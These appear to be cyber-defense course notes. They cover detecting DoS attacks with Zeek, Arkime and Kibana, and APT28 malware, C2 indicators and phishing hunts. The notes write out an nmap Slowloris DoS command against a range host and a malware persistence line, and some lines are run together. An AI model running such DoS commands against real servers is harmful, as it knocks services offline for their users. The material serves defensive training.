  - **S3**: Connection established and close attempt by responder seen, but no reply from originator.
  - **RSTO**: Connection established, originator aborted; sent a Reset (RST).
  - **RSTR**: Responder sent a RST.RSTOS0: Originator sent a SYN followed by a RST; never saw a SYN-ACK from the responder.
  - **RSTRH**: Responder sent a SYN ACK followed by a RST; never saw a SYN from the (purported) originator.
  - **SH**: Originator sent a SYN followed by a Final (FIN); never saw a SYN ACK from the responder — hence the connection was half open.
  - **SHR**: Responder sent a SYN ACK followed by a FIN; never saw a SYN from the originator.
  - **OTH**: No SYN seen, just midstream traffic. One example of this is a partial connection that was not closed later.
  5. Look at the _Security Onion - Connections - History_ pane
- Zeek contains info about cnnection history:
  - **S**: The originator sent a SYN segment.
  - **h**: The responder sent a SYN ACK segment.
  - **A** The originator sent an ACK segment.
  - **D**: The originator sent at least one segment with payload data. In this case, that was HTTP over TCP.
  - **a**: The responder replied with an ACK segment.
  - **d**: The responder replied with at least one segment with payload data.
  - **F**: The originator sent a FIN ACK segment.
  - **f**: The responder replied with a FIN ACK segment.
  6. Filter down on the **S**.
  7. Look at the Source/Destination IP fields
  8. Filter on specified IP
- This traffic is indicative of a SYN flood attack, which is discussed in the next task.
- Reviewing the Source IP addresses shows multiple hosts associated with this attack.
- This could be a misstep by the attacker or a disregard for Operations Security (OPSEC) because the originators are part of a larger group of bots.
- It is interesting that the IP address 104.53.222.1 is listed as the second-highest count — this may indicate an upstream route has been compromised.
  9. Go back to Arkime and filter for `tcpflags.syn == 1 && tcpflags.ack == 0 && ip.src == 104.53.222.1`

### SYN Flood Attack
- A SYN flood uses the three-way TCP handshake to consume ports on a target.
- An attacker sends a SYN packet with a spoofed source IP to a port with an active listener (e.g., Apache, Simple Mail Transfer Protocol [SMTP]) on the target.
- The target responds with a SYN/ACK packet to acknowledge the connection, but sends the SYN/ACK to the spoofed IP, which never responds as it did not initiate the connection.
- The target holds the TCP socket and port open, waiting for the response, until it reaches an internal timeout threshold. The attacker can send tens of thousands of these requests to try to use up all the available ports/sockets on the host and deny legitimate users access to the host.
- This attack is also known as a half-open attack because the three-way TCP handshake is only left half complete.

#### Indicators
- Monitor network flow for traffic that has a SYN, SYN ACK, or ACK only Connection State (conn_state)
  - **Arkime**: `tcpflags.syn-ack != 1 && tcpflags.syn == 1`
  - **Zeek**: `connection.state:S0`

#### Mitigations/Countermeasures
- Modern OSs have a maximum number of half-open connections allowed to thwart this behavior.

### Overlapping Fragmented Packets Attacks
- In networking, packet fragmentation happens all the time. Packets pass across different types of networks that may have varying Maximum Transmission Units (MTU).
- For example, a packet that leaves a Fiber Distributed Data Interface (FDDI) network could have up to 4,352 bytes in a single packet — an MTU of 4,352.
- When the packet needs to transit an Ethernet network, which only has an MTU of 1,500, the packets must be fragmented down to the new maximum size of 1,500 bytes or less.
- The fragmented packets are then reassembled back into the original datagram by the receiving host.
- Attackers use this knowledge to try to overwhelm receiving hosts by constructing packets that are fragmented in hard-to-reconstruct ways, such as with overlapping offsets or completely overlapping fragments.
- Internet Protocol version 4 (IPv4) also sets a 4.25-minute timeout on packet reconstruction — meaning that the recipient waits for missing fragments for up to 4.25 minutes. Attackers can abuse this window to block more resources for a period of time.
- Overlapping fragments are also used as a way to bypass Intrusion Detection Systems (IDS).
- Each OS deals with fragmentation differently, which can cause packets designed for exploitation to be reassembled differently depending on the underlying OS.
- If six packets are sent with the same Identifier (ID) and different offsets:

  <img width="624" height="270" alt="69838fa9-d100-4a6e-a3f4-abfa6f2c0a5b" src="https://github.com/user-attachments/assets/b058ba8f-9c86-4d38-8731-9f14d3ff571d" />

- …they can be reassembled with vastly different data on the distant end

  <img width="622" height="270" alt="80ef12ba-c11b-4912-8941-d02c7fcfa2e4" src="https://github.com/user-attachments/assets/e123c869-d5f0-4bb1-a407-dde11e41013a" />

#### Simulation
<img width="634" height="168" alt="image" src="https://github.com/user-attachments/assets/00a71bca-5979-4a68-b38b-0c98ceba7282" />

#### Indicators
- Devices rebooting after subsequent packets with more fragment flag setsFrag preprocessor in Snort or Suricata

#### Mitigations/Countermeasures
- Most modern OSs are patched, but check Internet of Things (IoT) devices and segment them from the rest of the network as much as possible
- Border router/firewall packet inspection

### Application Attacks
- Application DoS attacks leverage an attacker’s knowledge of the inner workings of an application or service in order to consume resources on the host.
- Each service can only actively support a certain amount of connections based on resources available and bandwidth.
- These attacks attempt to overwhelm a service (e.g., Apache) with some novel use of a connection, or by the sheer number of clients connecting to the service.
- CDA.com defenders noticed a lot more connections to an external web server — in fact, more connections existed than the number of authorized testers of the application.
- The requests seemed like legitimate HTTP requests, but they were continuous and from multiple hosts.

#### DETECTION THROUGH KIBANA
1. Open Kibana, and Select _Network_, then _HTTP_ under DataSets
2. Ensure Timeframe is correct
3. Filter on the Destination IP in question (`destination.ip: 104.53.222.2` in this case)
4. Pay attention to the _Source IP_ and _UserAgent_ panes
5. Filter down on _Macintosh UserAgent_ string (All of these events came from the same IP address)
6. Remove filter and add the _MSIE 6.0 UserAgent_ String
7. Pay attention to _Security Onion - HTTP - URI_ pane (**NOTE**: The curl/7.74.0 UserAgent is very generic, but the 9,000+ directory and file requests looks very much like a tool such as OWASP DirBuster or command line DIRB. Neither of these tools is a DoS tool, but they are often used for reconnaissance to find possible vulnerabilities or misconfigurations. In this case, DIRB was used with the default wordlist to scan www.cda.com from a bot net.)
8. Remove filter and add the _curl/7.74.0 UserAgent_ string

### HTTP Floods
- HTTP floods are the simplest of attacks, where an attacker simply makes a high volume of HTTP requests to a target.
- In order for an HTTP flood to be a successful attack, there has to be a large number of requests.
- This is easily accomplished with a botnet — a large network of compromised devices being manipulated by attackers.

#### Simulation
- The following Bash code performs two tasks:
  - Line 1 continuously requests the www.cda.com webpage until it is canceled.
  - Line 2 — without the comment (#) — continuously requests www.cda.com and www.cda.com:8080 websites in the background, which significantly increases the amount of requests because the previous curl is still running in the background.

    <img width="612" height="57" alt="image" src="https://github.com/user-attachments/assets/ed5f704d-2c97-4412-8cc6-fef5190e9596" />

#### Indicators
- Higher than baseline attempts for servicesSimilar UserAgent and request counts for webpages

#### Mitigations/Countermeasures
- Prioritize IP space
- Have a cached version of dynamic websites (database backend) to decrease load

### Sloth
- CDA.com defenders noted multiple connections to the web servers had extremely long durations.
- This is very peculiar because the sites currently only contain the default webpages, which do not contain a lot of content for a single connection to load.
- A Google search for the specific UserAgent string and DoS points to a Python script used to execute a Slowloris DoS, which uses the UserAgent string as one of the defaults.
  - `dos "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36"`

    <img width="750" height="419" alt="23b6790f-7b04-4d6b-bb27-eae8c8e25136" src="https://github.com/user-attachments/assets/e6bddb4f-96ee-4f61-9491-3d35166a158e" />

#### Slowloris
- Slowloris is an interesting DDoS technique. Instead of increasing the amount of data being sent to a server to overload its resources, the connection is slowed down as much as possible.
- This decreases the load on the attacker, which allows them the opportunity to start another connection to the server.
- Meanwhile, the server is holding the original connection open, waiting for the next portion of data to be sent from the attacker.
- HTTP requests have a very specific format and syntax requirement. One such requirement is that the server waits for a client to send two empty lines before processing any sort of request.
- In a Slowloris attack, the client (attacker) sends a GET request — instead of sending the empty lines as required, the attacker sends data to the web server every 15 seconds or so.
- This tells the server that the connection is still alive, causing it to hold resources open to wait for a properly-formed request.
- The attacker continues to create more requests using the same technique until all the network sockets or processes available to the web server are busy.

### Simulation
- The following Bash code executes a Nmap script called **http-slowloris** against the 104.53.222.2 **host on ports 80 and 8080** with a maximum of **400 parallel connections**.
  - `nmap -p 80,8080 --script http-slowloris --max-parallelism 400 104.53.222.2`

#### Indicators
- Long duration HTTP connections with very little data
- Zeek: Add filter event.duration between 100 and 1,000,000

#### Mitigations
- Apache servers have a module for patching, Microsoft IIS is not affected by this technique
- Setup reverse proxies, firewalls, load balancers, or content switches or migrate to unaffected by the attack
- Block attacking IP — connections must be from a valid IP

### Address
- CDA.com defenders know port 80 and 8080 have been thoroughly flooded, so they decided to check into port 53 traffic as well.
- UDP does not have to worry about DoS attacks that attack the TCP handshake, but attacking an application over UDP is still a very real threat.
1. Open up Kibana, Select _Network_ and then_DNS_
2. Set timeframe as required
3. Filter for destination IP of interest (104.53.222.2 in this case)
4. Analyze the _Source IP_ pane, paying attention to the fact that one of the IP's is a router IP; Filter on this Source IP
5. Scroll down and investigate the _DNS - Query_ pane. Sort this from High to Low
- All queries seem to be unique in this case
- The attack did not render the DNS server in this scenario inaccessible, but there was a significant spike in network resource usage during the event:

  <img width="898" height="603" alt="cb44bd99-cf93-43e6-a82d-d63d46ee0c4b" src="https://github.com/user-attachments/assets/8adc0c40-764c-4f5b-ab10-be6ec9c4d815" />

### DNS Query Flood
- DNS Query floods use legitimate DNS request formats to request a large amount of random DNS subdomains and DNS request types.
- The randomized subdomain requests force the DNS server to request DNS information for that subdomain's authoritative DNS server, which increases the amount of traffic flying around.
- The source IP is usually spoofed in order to decrease the likelihood of attribution back to the attacker, as well as the attacker’s bandwidth requirements.
- This attack attempts to fill up the DNS cache and overwhelm resources on the DNS server, which decreases the server’s availability to legitimate users.

#### Simulation
- The following simulated Scapy code submits a DNS Query request to the 104.53.222.2 server for a random_uuid.cda.com as fast as the host can send the packets.
- The source IP is spoofed so all traffic is routed to the .1, which would be ignored as unsolicited packets.

  <img width="658" height="125" alt="image" src="https://github.com/user-attachments/assets/a978a904-5433-46a8-b60d-f8b641e1ab43" />

#### Indicators
- Spike in DNS requests from baseline

#### Mitigations/Countermeasures
- Develop distributed DNS system with capability, absorb, and block all attack traffic in real-time

### Destructive DoS Attacks
- The final DoS discussed in this lesson is often an afterthought — if a malicious actor wants to deny legitimate users access to a host, why not take the host down in some fashion?
- This type of attack is usually deliberate, but may be accidentally caused by **upgrades**, **patches**, or other **legitimate activity** being performed on the host.
- For example, the adversary may exploit a vulnerability on a host in order to crash it.
- Alternatively, if an attacker has been able to gain remote access to a web server or database server, they can deny access to the website by deleting or encrypting content so that no one can access the site.
- Ransomware attacks, such as the 2021 Colonial Pipeline attack, are predicated on the concept of destructive DoS attacks — attackers hope to cause so much damage by encrypting the victim’s data, that the victim pays a large sum of money to the attacker in order to restore normal operations.
- Intentional destructive attacks usually require that an attacker gain access to a host.
- Additionally, these attacks are generally less likely to occur because an attacker that took the time to gain access to a host may not want to lose that access by taking the host down.
- However, this avenue should still be considered a possible way for attackers to deny access to a resource.

#### Simulation
- A simple destructive DoS attack on the CDA.com website might involve the rename of the index.html file.
- This file is the default HTML page used by most applications — removal or renaming of this file would cause users navigating to the site’s home page to receive a 404 error, as the web server tries to load the index.html file but fails to find it.
- A simple rename like this could be performed using the following commands.
- The commands first use Secure Shell (SSH) to provide remote access to the web server.
- The mv command then renames the default webpage to a different filename, effectively denying access to that page for all users.

  <img width="415" height="61" alt="image" src="https://github.com/user-attachments/assets/cfdc09c6-4321-415b-a940-ba9ad95a1cf3" />

- In this example, the attacker likely gained access to the web server using already-compromised credentials, as evidenced by the commands' reliance on the CDA.com private key.
- Once the attacker gains access to the web server console, they can change anything they want on the website.
- This may include the destruction of the site, as noted above, or the intentional defacement of the content hosted on the web server. 

#### Indicators
- Monitor for non-standard access to devicesMonitor for long-duration connections to websites

#### Mitigations/Countermeasures
- Monitor access to remotely accessible sites for non standard user connections
- Limit remote access to specific systemsUpdate passwords from defaults

# MOD 19
## APT 28 Attacks & Defenses
### CORESHELL
- The CORESHELL backdoor is used to download other modules and is installed by the initial exploit’s dropper, which deletes itself after starting CORESHELL.
- CORESHELL is usually a Dynamic-Link Library (DLL) started using rundll32.
- The **DLL file has been seen** in the following locations:
   - **C:\Program Files\Common Files\Microsoft Shared\MSInfo\**
   - **C:\Users\<user name>\AppData\Local\Microsoft\Help\**
   - **C:\ProgramData\**
- The **C2 configuration** was **encrypted in a file** or in the **registry**:
   - **HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\<path>**
   - **%ALLUSERSPROFILE%\msd**
   - **%PROGRAMDATA%\msd**
- **Persistence** was maintained by using **auto-start registry keys**, including the following:
   - **HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\**
   - **HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders\**
   - **HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\ShellServiceOjbectDelayLoad\**
   - **HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders\HKCU\Environment\UserInitMprLogonScript = <batchfile>**
   - **%ALLUSERSPROFILE%\Application Data\Microsoft\Internet Explorer\Quick Launch\**
   - **%USERPROFILE%\Application Data\Microsoft\Internet Explorer\Quick Launch\**
- CORESHELL and second stage implants were also composed of various tools to include **keylogger**, **email address and file harvester**, **system information about the local computer**, and **remote communication with C2 servers**.
- There was also a component designed to infect connected Universal Serial Bus (USB) storage devices so that information and C2 could be achieved with and captured from air-gapped computers that are not on the network when a user transfers the USB device to the air-gapped computer and back to the network again.
   - This component registered a callback using the **RegisterDeviceNotification** Application Programming Interface (**API**) function to detect when a USB device was inserted into the compromised computer and harvest data from it, or infect the device.
- Some of the filenames seen for various components of CORESHELL include:
   - **runrun.exe**
   - **vmware-manager.exe**
   - **ctf.exe**
   - **MicrosoftSup.dll**
   - **mshelpc.dll**
   - **winsys.dll**
   - **advstorshell.exe**
   - **credssp.dll**
   - **mfxscom.dll**
   - **api-ms-win-[random].dll**
   - **run_x86.exe**
   - **run_x64.exe**
   - **psw.exe**
   - **svchosl.exe**
   - **svehost.exe**
   - **servicehost.exe**
   - **SupUpNvidia.exe**

- Microsoft was also able to analyze and document the network protocols used by second-stage implants for C2, which included Hypertext Transfer Protocol (**HTTP**), **SMTP**, and **POP3**.
- Initially the backdoor would test network connectivity by sending a series of **HTTP POST requests** to legitimate websites, and then **attempt communication with the configured C2 servers**.
- The domains used for the C2 servers are designed to blend in with legitimate traffic, or look like **software update sites** to try and trick users from investigating them further.
- In some cases, the malware had an additional component intended to use the **Open-SSL** (Secure Sockets Layer) library to **encrypt and route C2 communications** through a victim’s normally configured proxy server, such as may be configured for an enterprise or corporate network.
- Other tools APT28 used that Microsoft documented in this report include:
   - **WinExe** — A remote command-line execution tool similar to psexec.exe
   - **Mimikatz** — A tool used to retrieve security tokens and hashes from memory (used for attacks like pass-the-hash)

### Cannon
- Palo Alto Networks Unit 42 threat research team reported on the **Cannon** malware used by APT28 in late 2018.
- **Cannon** makes extensive use of **SMTP** and **POP3** (both encrypted and unencrypted protocols) rather than web-based C2 channels other threat actors tend to use.
- Some of the initial compromises documented by Unit 42 included **Microsoft Word documents** being sent with spearphishing emails to **European government organizations**.
- The file name included crash list (Lion Air Boeing 737).docx as a lure for victims to open it.
- This document had **malicious macros and a payload** to download and save additional malware from a C2 server as:
   - **%TEMP%\~temp.docm**
   - **%APPDATA%\MSDN\~msdn.exe**

- This additional malware was a variant of APT28 second-stage implants compiled in the **Delphi language** and **compressed** using the Ultimate Packer for Executables (**UPX**) packer.
- **Cannon** sent various system reconnaissance data to the C2 servers which included the **output from the systeminfo.exe** and **tasklist commands**, as well as taking a s**creenshot of the victim’s host computer screen**.
- In the cases documented by Unit 42, **Cannon sent emails** to sahro.bella7@post.cz with **various attachments and included a unique system identifier**.
- The email was sent via **SMTPS** from one of the following accounts:
   - bishtr.cam47@post.cz
   - lobrek.chizh@post.cz
   - cervot.woprov@post.cz
   - trala.cosh2@post.cz
- Attachment names included:
   - i.ini
   - sysscr.ops
<img width="723" height="215" alt="05b95e4b-c432-4ee0-a272-3c0d3c6502ae" src="https://github.com/user-attachments/assets/6c266ed2-add2-49de-9410-8e882448b4ec" />

- Once the compromised computer sent system information to the sahro.bella7@post.cz account, the threat actor sent an email to trala.cosh2@post.cz with commands in an American Standard Code for Information Interchange (ASCII) hexadecimal format for the compromised computer to execute.
- The compromised computer retrieved these commands using POP3S from the trala.cosh2@post.cz account.
- It is important to note that this historical data shows the tactic APT28 was using and that email addresses used in other campaigns are not the same.
- One of the persistence mechanisms documented by Unit 42 was the use of DLL side-loading targeted at Microsoft Office products.
- Recall from the Libraries lesson that DLL side-loading takes advantage of Windows Side-by-Side (SxS, or Win SxS) assembly system to load a duplicate, but vulnerable, DLL to the legitimate one.
- The SxS system is used to manage multiple, and conflicting versions of the same DLL.
- The registry key **HKCU\SOFTWARE\Microsoft\Office test\Special\Perf** is used by legitimate Office applications for performance testing, but is **not a normal function** used by most users.
- Since the HKCU hive is able to be modified by the current user, this mechanism can be used without having elevated privileges necessary to modify keys in the HKLM hive.

### Komplex or XAgent OS X
- Unit 42 also analyzed and documented APT28 malware used on macOS, which is known as Komplex and XAgent OS X.
- **Komplex** relies extensively on **HTTP** to **communicate with C2** servers using both **POST and GET HTTP methods**.
   - The HTTP requests were **Base64** encoded using URL safe algorithms and may have also been encrypted using the **Rivest Cipher 4 (RC4) stream cipher**.
   - The Komplex dropper is saved as **/tmp/content** and is used to also install additional malware used for persistence.
   - The payloads downloaded were saved in the following locations:
      - **/Users/Shared/.local/kextd**
      - **/Users/Shared/com.apple.updates.plist**
      - **/Users/Shared/start.sh**
         - The start.sh script calls launchctl to automatically execute the Komplex backdoor each time the system starts:
         - `#!/bin/sh launchctl load -w ~/Library/LaunchAgents/com.apple.updates.plist`

- The main Komplex payload, kextd uses system calls to check for any debuggers present, then checks for external connectivity by performing HTTP GET requests to Google’s website before performing any of its malicious functions.
- The payload communicates with its C2 servers using HTTP POST requests with the following structure:
   - `/<random path>/<random string>.<valid web file extension>/?<random string>=<encrypted token>`
- Komplex is capable of reconnaissance and starting a keylogger to obtain credentials.

### Fysbis
- Fysbis is malware designed for Linux systems and has been seen as both 32-bit and 64-bit ELF binaries.
- Unit 42 released its analysis of Fysbis in 2016. Some of the IoCs related to the files and binaries Fysbis installed on compromised systems are:
   - **/bin/rsyncd with root privileges**
   - **~/.config/dbus-notifier/dbus-inotifier with non-root privileges**
   - **/bin/ksysdefd with root privileges**
   - **~/.config/ksysdef/ksysdefd with non-root privileges**

- One of the versions of Fysbis that Unit 42 analyzed did not have the debugging symbols stripped from the binary.
- Most malware uses techniques to remove debugging data from binaries — called stripped binaries — to hinder analytic and reverse-engineering efforts.
- APT28 typically uses stripped binaries and the sample analyzed by Unit 42 is likely an oversight that was missed during their development and operational release/use processes.
- The Fysbis backdoors were not deemed especially advanced, but that is likely due to the lack of security products available for Linux systems.
- More advanced threat actors typically develop their malware to the state of the security systems present for a particular target so as to not “waste” development time and hold in reserve more prestigious exploitation techniques they have developed so they are not compromised unnecessarily. 

### Drovorub
- Drovorub is a malware toolset designed for Linux systems and was analyzed and reported on by the NSA and FBI in the August, 2020 Cybersecurity Advisory discussed earlier.
- Drovorub consists of a kernel module rootkit, file transfer and port forwarding capabilities, and a C2 communication module.
- Since Drovorub is installed as a kernel module rootkit, it can hide artifacts from commonly installed security products and system analysis tools.
- The C2 communications can be detected at network boundaries since the rootkit only affects the infected system.
- The kernel module rootkit is persisted through reboots unless Unified Extensible Firmware Interface (UEFI) secure boot is enabled in Full or Thorough modes of operation.
- The different components of Drovorub communicate via JavaScript Object Notation (JSON) over WebSockets and use Rivest-Shamire-Adleman (RSA) public key encryption.
- Drovorub has two components that are installed on compromised systems, the Drovorub-client and the Drovorub-kernel module.
- The Drovorub-client’s initial configuration contains the server callback URL, a username and password, and an RSA public key for encryption embedded into the binary.
- Once a successful callback and registration has been completed, the client writes a new JSON-formatted text configuration file to disk, which is hidden by the kernel module.
- The Drovorub-kernel module creates system call hooks for the functions it needs to be able to hide files, processes, and sockets.
- The kernel module then hides the client’s running processes, the executable and configuration files, and any network connections or listening ports owned by the client.
- The Drovorub Cybersecurity Advisory report details how the client and server communications start, specifically using HTTP with the Upgrade request to use a WebSocket, which the server responds to with an HTTP 101 Switching Protocols response and starts the WebSocket handshake.
<img width="619" height="257" alt="ae1a8aea-6952-4ded-b561-388f651a71dd" src="https://github.com/user-attachments/assets/4ce5d372-c9a8-4128-ac84-c519645d7637" />

- Drovorub has a module designed for tunneling connections through the compromised system, allowing attackers additional access to the networks with which the compromised system is attached.
- The port forwarding rules, or entries, in the tunnel module are not automatically hidden and the attacker must specifically instruct the kernel module to hide those connections.
- The Drovorub-client and Drovorub-kernel module use a designated pseudo-device, **/dev/zero**, for communication between the two processes.
- The **/dev/zero** pseudo-device is not intended for bi-directional Input/Output, but the kernel module hooks the function calls associated with reading and writing to this device, allowing it to re-write how the pseudo-device operates when the communication is between the client and kernel module.
- The best method recommended in the Cybersecurity Advisory for detecting Drovorub is to use network-based detection techniques using a Network Intrusion Detection System (**NIDS**) to look for the JSON C2 traffic and Yara rules to identify the Drovorub components.

### APT28 | Attacks and ATT&CK
<img width="1213" height="4417" alt="300723d9-ff5c-40fd-8548-04aa9051fbd5" src="https://github.com/user-attachments/assets/e31d2739-8596-4737-b91c-07ee2bb9b55a" />

#### Campaigns
- APT28 attack campaigns are highly targeted. Each tool within the campaign has been customized with hardcoded target name space and IP addresses.
- Domain spoofing and domain typo-squatting techniques have also been utilized to hide in the higher traffic connections from target space.
- These tactics show a high degree of understanding of their targets as well, and show an intentional effort to decrease uncontrollable spread of their tools.
- APT28 has been associated with attack campaigns using the following domains for C2 and phishing:
   - linuxkrnl.net
   - accounts.qooqle.com
   - accounts-gooogle.com
   - misdepatrment.com
   - actblues.com
      - misdepatrment and actblues were used for spoofing legitimate departments and donation sites for specific campaigns, while the others were used across multiple spearphishing campaigns.
- Spearphishing campaigns have also been correlated with APT28 using very targeted verbiage and attachments to increase click through and exploitation.
   - For example, the DCCC and DNC hack used an attachment named hillary-clinton-favorable-rating.xlsx to lure recipients into opening the document. 
<img width="965" height="2060" alt="029cd1f7-e16d-4736-afef-09c921f69c9f" src="https://github.com/user-attachments/assets/116b4b36-1d2a-4c0f-8ac6-605bbd1970ab" />

- APT28 has been seen using services like the bit.ly URL shortener to mask URLs for multiple attack campaigns.
- In some cases a more generic Google account compromise notification has been used to lure unsuspecting targets to compromised and spoofed websites like the following:
<img width="465" height="409" alt="706a395b-e517-4a07-98cb-88088a699820" src="https://github.com/user-attachments/assets/8715a2b3-e7e7-4b17-8f87-2a5da2689281" />

### Malware Documents Analysis
1. Open CLI and navigate to the _C:\Users\trainee\Desktop\OfficeMalScanner_ and perform a directory listing
   - **OfficMalScanner** is a standalone tool that can scan or analyze Office documents for the presence of shellcode, Portable Executable (PE) binaries and Visual Basic (VB) macro code.
   - This particular tool is able to perform heuristics analysis on older Office documents, but can only uncompress, or inflate, newer Office document formats for manual analysis and identification of binary .bin files in the archive.
   - The newer Microsoft Open Extensible Markup Language (XML) format based Office documents are compressed archives that contain separate files and directories for things like embedded images, attachments, or other embedded files.
   - These embedded files, which may be objects like Portable Document Format (PDF) documents, music files, or executables, all have extensions in the uncompressed directory structure that end in .bin.
   - VB macros in these archives are stored in a file called **vbaProject.bin**.
   - Older Office formats, pre-2007, use a Microsoft Compound File Binary (CFB), also known as Object Linking and Embedding 2 (OLE2), which contains streams of data for the different components, all in the same complex file.
   - **OfficeMalScanner** can scan for shellcode heuristics and PE files in the vbaProject.bin file, after it has been extracted from the archive.
2. Run the following to view help and usage: `OfficeMalScanner.exe`
   - The relevant options for this workflow are the **scan**, **info**, and **inflate** options.
   - Notice the warning. Since this exercise is being conducted in a training range, analysis of these documents is not being conducted in a sandboxed environment.
   - Notice the formula OfficeMalScanner uses to assign its Malicious index rating:
      - **Executable** files have an index of **20**
      - **Code** included in the file has an index of **10**
      - **Strings** that are associated with **Windows API calls**, like memory allocation, have an index of **2O**
      - **LE** objects have an index of **1**
         - The combination of these items increases the index **OfficeMalScanner** uses and the higher the index, the more likely the file is actually malicious.
   - **NOTE**: You should always analyze unknown files in an isolated and sandbox environment to prevent the accidental execution of malware.
   - The files in this lesson are carefully constructed to be used in the training environment.
      - **Scan** — Scans for shellcode heuristics and PE files that exist in the OLE file and returns an index on how malicious the file appears to be based on the contents
      - **Info** — Extracts the various OLE objects that are embedded in the file, including VB macros, and saves them to a directory for further analysis
      - **Inflate** — Uncompresses the MS Open XML format Office document and saves the various files in a temporary directory; file that end in .bin should be analyzed and OfficeMalScanner can be run on those files individually, if they exist
3. Change to the `..\M19L1 Document Examples\` directory and run a dir
4. Run `OfficeMalScanner.exe good.doc scan` and 'OfficeMalScanner.exe good.doc info`
   - Nothing Malicious was found on this document
5. Run the same thing on the _bad.doc_
   - Bad Stuff was found
6. Look at the Macro files that were found
7. Run the scans on the _unknown.doc_
   - This file is in the newer Open XLM format and compressed, so we have to inflate it
   - Run the INFLATE scan on this document

### Command and Control
- C2 allows the agent or malware to receive tasking from the APT. Over the years APT28 has had many different tools.
- The use of SMTP and POP3 as C2 mechanisms was discussed earlier in this lesson.
- A hunt methodology to identify any malware using SMTP as a C2 mechanism has several aspects and approaches.
- One way to isolate this mail traffic is to stack the following filters together with the AND operator:
   - Filter for destination port 25 (and any other outgoing mail ports logging is available for)
   - Filter for traffic not destined to the internal mail serverFilter for traffic not originating from the internal mail server
- These filters are combined using the AND operator to specifically filter for mail protocol traffic that is NOT using the internal mail server.
- If each filter is used separately, the intended effect is much different, where ALL traffic to or from the mail server is filtered.
- The important part is to ensure the filter chain is specifically scoped to mail protocols.
- There may be legitimate reasons for this, but typical use would be to authenticate to the internal mail server and the corporate mail server would forward the email and make the necessary connections to external mail servers. 
1. Open Kibana, Set Timeframe as required, and add the filter for smtp: `event.dataset.keyword is smtp`
2. Toggle at minimum, the _smtp.from, smtp.to, smtp.subject, smtp.mail_from, smtp.recipeint_to, smtp.last_reply, destination.ip, and source.ip_ fields
3. Filter for destnination Port 25 (SMTP)
4. Filter out the internal mail server IP (source and destination)
5. Pay attention to the _smtp.subject.keyword and smtp.to.keyword_ fields, in this case, they do not match.
6. Filter on _smtp.to.keyword: violet.king_
   - Looking in the _smtp.mail_from_ field, we can see all emails coming from _guy.silva@internet.com_ who is not in the domain, so he would not be able to authenticate
7. Examine the top event:
   - This shows the following to further investigation:
      - 172.16.3.2 — internal host
      - cda-acct-1.cda.corp — internal host
      - 200.200.200.2 — external mail server
      - inet-mail.internet.com — external mail server

### POP3 Investigation
- Now that we have identified the SMTP key data pieces, we can create a hypothesis about the client side, which is POP3
   - **HYPOTHESIS:** An attacker that uses SMTP for C2 may also use POP3 for the client side of the C2 to mailboxes outside of the domain.
1. From the Kibana Home dashboard, filter down on `destination.port: 110` and `event.dataset.keyword: network_connection` to see any POP3 traffic
2. Ensure your timeframe is accurate
3. Filter out traffic destined for the CDA Servers (174.16.1.0/24)
4. Examine the _Message_ field in the First log that populated
   - We can see the same cda-acct-1 (172.16.3.2) speaking to the 200.200.200.2 external email server
5. Examining the _Logs Over Time_ graph, we can see that there are roughly 150 occurances every 30 minutes (5 times per minute)

### Post Compromise
- After any threat actor gains initial access, there is a period where the attacker attempts to survey the environment they have gained access to.
- This includes identifying running processes, user accounts, and domain membership, among many other details, of the host and network configuration.
- More advanced threats also attempt to identify and disable any monitoring, logging, or anti-virus/anti-malware software that is occurring or installed in order to prevent detection.
- Both initial and subsequent remote access from an attacker tend to be over a command line or command shell interface since text is less noisy than graphical interfaces which require more network traffic in order to update the remote display and provide updates to things like mouse position.
- Detection and hunting for post-compromise activity typically includes identifying anomalous processes and network traffic.
- Some of the indicators that are most often used are:
   - **Processes that execute out of temporary directories**
   - **Processes that are executed from shell or scripting engines, like PowerShell, that are not known good**
   - **Spikes in network traffic, especially after working hours, that are not typical of baseline network activity**
   - **System inventory and reconnaissance-like commands run by non-system administrators, or intended only for system administrators**
   - **Hosts probing for connectivity to other organizations, networks, or hosts that do not normally directly communicate**
   - **Attempts to circumvent security applications and procedures**
- More advanced actors are very quiet and try to generate as little traffic as possible to prevent detection.
- Less sophisticated actors are not as refined and may have mistakes, misconfigurations, or break their operational security procedures in order to attempt to troubleshoot problems while they are connected to the compromised host.
- This generates more network traffic and logging and is much more likely to be found.
- A sophisticated actor often collects as much info as they can without generating too much traffic, troubleshoot offline, and come back later to continue their operations.
- As was introduced earlier in the lesson, APT28, in particular, has a very sophisticated malware toolkit and has been operating for many years.
- The TTPs they use have been developed and refined and they have the capability to operate undetected in networks for long periods of time.

### Phishing Investigation
<img width="599" height="465" alt="e6bb7913-0bd5-4d3a-80a0-fc4ed064d471" src="https://github.com/user-attachments/assets/705fc50a-abac-4b90-ba6f-3201d19a17d4" />

- Some key items to consider from the email that was sent:
   - **From**: ieupdate@internet.com
   - **To**: camron.smith@cda.com
   - **Time**: Monday Aug 9, 2021 @ 20:48
   - **Attachment**: ieupdate.zip
   - **Subject**: Urgent Microsoft Internet Explorer Update Needed

1. From Kibana discover page, filter for smtp data
2. Adjust your timeframe to the time of the attack
3. Filter down on the username that was compromised
4. Expand the log for the incident that matches the given information
   - Note that this was not TLS encrypted comms and SMTP path included unknown IP addresses outside of CDA network.
6. Filter for the unknown sender email (smtp.mail_from:ieupdate@internet.com) and remove the _camron.smith_ filter
7. Adjust timeframe for earlier in the day
8. To determine what else happened around this timeframe, go to the Home dashboard and adjust timeframe accordingly
9. Filter for the workstation that the affected user was on (cda-acct-1@cda.corp in this case) from the _Log count by Node_ table
10. As we know that they utilize phishing, filter down on the _file_create_ dataset
11. Expand the first log and examine the message field

#### Network Connections
1. Remove the _file_creation_ dataset and filter for _process_creation_
   - Looking at the logs, you can see that camron ran the program twice
2. Remove this filter, and hone down on _network_connection_ events.
   - Looks like the executable tried to open a network connection to _210.210.210.2_ on port 8080.

### Investigation | Hunt | Compromise
- Based on the previous investigation, higher headquarters tasked your CPT to conduct a further hunt to characterize any C2 identified, and identify if any post-compromise activities indicative of an APT are present on the network.
   - Recall the initial investigation identified the cda-acct-1, 172.16.3.2, host as having many suspicious indicators of a compromise.
